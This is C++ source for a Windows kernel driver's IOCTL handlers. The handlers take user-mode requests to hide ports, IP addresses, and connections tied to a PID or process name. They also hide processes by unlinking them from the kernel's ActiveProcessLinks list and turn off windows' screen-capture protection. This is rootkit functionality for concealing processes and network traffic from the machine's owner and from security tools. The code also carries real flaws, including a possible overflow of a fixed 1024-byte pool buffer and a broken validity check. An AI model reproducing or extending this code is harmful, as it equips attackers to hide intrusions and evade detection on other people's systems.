#include "Driver.h"

static NTSTATUS NetRetrieveIntegerFromIrp(
	_In_ PIRP Irp, _Out_ ULONG& ret)
{
	PCSZ inputBuf = (PCSZ)(Irp->AssociatedIrp.SystemBuffer);
	ASSERT(inputBuf != nullptr);

	ANSI_STRING pidAnsiString{};
	UNICODE_STRING pidUnicodeString{};
	RtlInitAnsiString(&pidAnsiString, inputBuf);
	RtlAnsiStringToUnicodeString(&pidUnicodeString, &pidAnsiString, TRUE);

	KdPrint(("Input Value(Unicode String): %wZ\n", &pidUnicodeString));

	ULONG value{ 0 };
	NTSTATUS status = RtlUnicodeStringToInteger(&pidUnicodeString, 10, &value);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Failed to convert [%wZ] to Integer Value: Status[0x%X]\n", &pidUnicodeString, status));
		return STATUS_INVALID_PARAMETER;
	}

	if (value == 0)
	{
		KdPrint(("Failed to convert Port to Integer Value\n"));
		return STATUS_INVALID_PARAMETER;
	}

	ret = value;
	return STATUS_SUCCESS;
}

static VOID NetRetrieveUnicodeFromIrp(
	_In_ PIRP Irp, 
	_Out_ UNICODE_STRING& processName)
{
	PCSZ inputBuf = (PCSZ)(Irp->AssociatedIrp.SystemBuffer);
	ASSERT(inputBuf != nullptr);

	ANSI_STRING processAnsiString{};
	RtlInitAnsiString(&processAnsiString, inputBuf);
	RtlAnsiStringToUnicodeString(&processName, &processAnsiString, TRUE);

	KdPrint(("Input Value(Unicode String): %wZ\n", &processName));
}

NTSTATUS IoctlHandlers::HandleTestConnection(_In_ PIRP Irp, _In_ const size_t BufferSize) 
{

	NTSTATUS status{STATUS_SUCCESS};

	char* inputBuf = static_cast<char*>(Irp->AssociatedIrp.SystemBuffer);
	char* outputBuf = static_cast<char*>(Irp->AssociatedIrp.SystemBuffer);

	KdPrint(("TEST_CONNECTION: got input:[%s]\n", inputBuf));

	char* outputPrefix = "recieved input-";

	//return "STATUS_BUFFER_TOO_SMALL" if return buffer length is too small
	if (BufferSize < (strlen(inputBuf) + strlen(outputPrefix) + 1)) {

		KdPrint(("TEST_CONNECTION: Ouyput buffer too small.\n"));
		status = STATUS_BUFFER_TOO_SMALL;
		Irp->IoStatus.Information = 0;

	}

	else 
	{
		//init a buffer from paged pool
		char* readBuf = reinterpret_cast<char*>(ExAllocatePool2(POOL_FLAG_PAGED, 1024, TAG_NET));
		if (readBuf == nullptr)
		{
			status = STATUS_INSUFFICIENT_RESOURCES;
			Irp->IoStatus.Status = status;
			Irp->IoStatus.Information = 0;
			return status;
		}

		RtlZeroMemory(readBuf, 1024);

		//set the buffer to prefix ("hello from kernel mode...") + user input
		RtlStringCbCatA(readBuf, BufferSize, outputPrefix);
		RtlStringCbCatA(readBuf, BufferSize - strlen(outputPrefix) - 1, outputBuf);

		//copy the memory to the output buffer
		RtlCopyMemory(outputBuf, readBuf, strlen(readBuf) + 1);

		//free the paged pool buffer
		ExFreePoolWithTag(readBuf, TAG_NET);

		KdPrint(("TEST_CONNECTION: Sending to usermode %s\n", outputBuf));
		status = STATUS_SUCCESS;
		Irp->IoStatus.Information = strlen(outputBuf) + 1;
	}

	Irp->IoStatus.Status = status;
	return status;
}

NTSTATUS  IoctlHandlers::HandleHidePort(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength == 0)
	{
		KdPrint(("Invalid Length:%zu\n", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	KdPrint(("Input Buffer Length:%zu\n", InputBufferLength));
	KdPrint(("InputPort:%s\n", (char*)Irp->AssociatedIrp.SystemBuffer));

	ULONG port{ 0 };
	NTSTATUS status{ NetRetrieveIntegerFromIrp(Irp, port) };
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Error:[%s] Invalid Value\n", __FUNCTION__));
		return status;
	}

	KdPrint(("HidePort: Recieved Port:%lu \n", port));

	NetHook::NETHOOK_HIDDEN_CONNECTION hiddenConnection{};
	hiddenConnection.Port = (USHORT)port;
	NetHook::NetAddHiddenConnection(&hiddenConnection);

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	return status;
}

NTSTATUS  IoctlHandlers::HandleHideIP(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength != sizeof(NetHook::NETHOOK_HIDDEN_CONNECTION))
	{
		KdPrint(("Invalid Length! %zu", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	NetHook::PNETHOOK_HIDDEN_CONNECTION inputBuf = static_cast<NetHook::PNETHOOK_HIDDEN_CONNECTION>(Irp->AssociatedIrp.SystemBuffer);
	ASSERT(inputBuf != nullptr);

	NetHook::NetAddHiddenConnection(inputBuf);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	return STATUS_SUCCESS;
}

NTSTATUS IoctlHandlers::HandleHideRemoteIP(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength != sizeof(NetHook::NETHOOK_HIDDEN_CONNECTION))
	{
		KdPrint(("Invalid Length! %zu", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	NetHook::PNETHOOK_HIDDEN_CONNECTION inputBuf = static_cast<NetHook::PNETHOOK_HIDDEN_CONNECTION>(Irp->AssociatedIrp.SystemBuffer);
	ASSERT(inputBuf != nullptr);

	NetHook::NetAddHiddenConnection(inputBuf);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	return STATUS_SUCCESS;
}

NTSTATUS  IoctlHandlers::HandleHideConnectPID(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength == 0)
	{
		KdPrint(("Invalid Length:%zu\n", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	KdPrint(("Input Buffer Length:%zu\n", InputBufferLength));
	KdPrint(("Input PID:%s\n", (char*)Irp->AssociatedIrp.SystemBuffer));

	ULONG pid{ 0 };
	NTSTATUS status{ NetRetrieveIntegerFromIrp(Irp, pid) };
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Error:[%s] Invalid Value\n", __FUNCTION__));
		return status;
	}

	KdPrint(("HideConnectProc: Recieved process id: %d \n", pid));

	NetHook::NETHOOK_HIDDEN_CONNECTION hiddenConnection{};
	hiddenConnection.ConnectPID = pid;
	NetHook::NetAddHiddenConnection(&hiddenConnection);

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	return status;
}

NTSTATUS  IoctlHandlers::HandleHideConnectProcessName(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength == 0)
	{
		KdPrint(("Invalid Length:%zu\n", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	KdPrint(("Input Buffer Length:%zu\n", InputBufferLength));
	KdPrint(("Input Process Name:%s\n", (char*)Irp->AssociatedIrp.SystemBuffer));

	NetHook::NETHOOK_HIDDEN_CONNECTION hiddenConnection{};
	UNICODE_STRING &processName{hiddenConnection.ConnectProcess};
	NetRetrieveUnicodeFromIrp(Irp, processName);
	if (!NT_SUCCESS(processName.Buffer == nullptr || processName.Length == 0))
	{
		KdPrint(("Error:[%s] Invalid Value\n", __FUNCTION__));
		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}	
	NetHook::NetAddHiddenConnection(&hiddenConnection);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	return STATUS_SUCCESS;
}

NTSTATUS  IoctlHandlers::HandleHidePID(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength == 0)
	{
		KdPrint(("Invalid Length:%zu\n", InputBufferLength));

		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	KdPrint(("Input Buffer Length:%zu\n", InputBufferLength));
	KdPrint(("Input PID:%s\n", (char*)Irp->AssociatedIrp.SystemBuffer));

	ULONG pid{ 0 };
	NTSTATUS status{ NetRetrieveIntegerFromIrp(Irp, pid) };
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Error:[%s] Invalid Value\n", __FUNCTION__));
		return status;
	}

	KdPrint(("HideProc: Recieved process id: %d \n", pid));

	//manipulate ActiveProcessLinks to hide process
	status = HideProcess::HideProcessByProcessID(pid);

	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	return status;
}

NTSTATUS IoctlHandlers::DisableWindowCaptureProtect(
	_In_ PIRP Irp,
	_In_ const size_t InputBufferLength)
{
	if (InputBufferLength != sizeof(DisplayHook::protect_sprite_content))
	{
		KdPrint(("Invalid Length. Received[%zu] Expected[%zu]\n", InputBufferLength, sizeof(DisplayHook::protect_sprite_content)));

		Irp->IoStatus.Status = STATUS_INFO_LENGTH_MISMATCH;
		Irp->IoStatus.Information = 0;
		return STATUS_INFO_LENGTH_MISMATCH;
	}

	KdPrint(("Input Buffer Length:%zu\n", InputBufferLength));
	NTSTATUS status = DisplayHook::DisableWindowCaptureprotect((DisplayHook::pprotect_sprite_content)Irp->AssociatedIrp.SystemBuffer);
	
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	return status;
}